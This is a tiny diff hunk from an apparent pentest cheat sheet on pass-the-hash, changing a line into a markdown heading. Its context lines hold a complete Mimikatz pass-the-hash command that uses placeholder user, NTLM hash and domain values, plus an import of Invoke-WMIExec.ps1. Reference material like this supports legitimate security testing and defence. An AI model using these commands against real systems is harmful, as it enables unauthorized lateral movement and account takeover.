@@ -31,7 +31,7 @@ PTH using Mimikatz:
 mimikatz.exe privilege::debug "sekurlsa::pth /user:<USER> /rc4:<NTLM> /domain:<DOMAIN> /run:cmd.exe" exit
 ```
 
-PTH using PowerShell
+#### PTH using PowerShell
 
 ```bash
 import-module .\Invoke-WMIExec.ps1
